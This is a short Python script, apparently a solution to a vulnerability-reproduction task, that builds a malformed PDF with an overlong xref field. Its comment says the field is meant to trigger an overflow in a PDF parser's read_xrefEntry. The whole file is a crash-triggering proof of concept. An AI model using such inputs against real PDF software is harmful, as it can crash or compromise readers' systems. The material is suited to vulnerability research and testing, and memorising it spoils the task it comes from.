import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'%PDF-1.7\n'
        # Overlong f1 consisting only of zeros to trigger read_xrefEntry overflow
        zeros_f1 = b'0' * 128
        # Minimal xref section with one entry
        xref_section = b''.join([
            b'xref\n',
            b'0 1\n',
            zeros_f1, b' ', b'00000', b' f \n',
            b'trailer\n',
            b'<< /Size 1 >>\n',
        ])
        xref_offset = len(header)
        trailer = b''.join([
            b'startxref\n',
            str(xref_offset).encode('ascii'), b'\n',
            b'%%EOF\n'
        ])
        return header + xref_section + trailer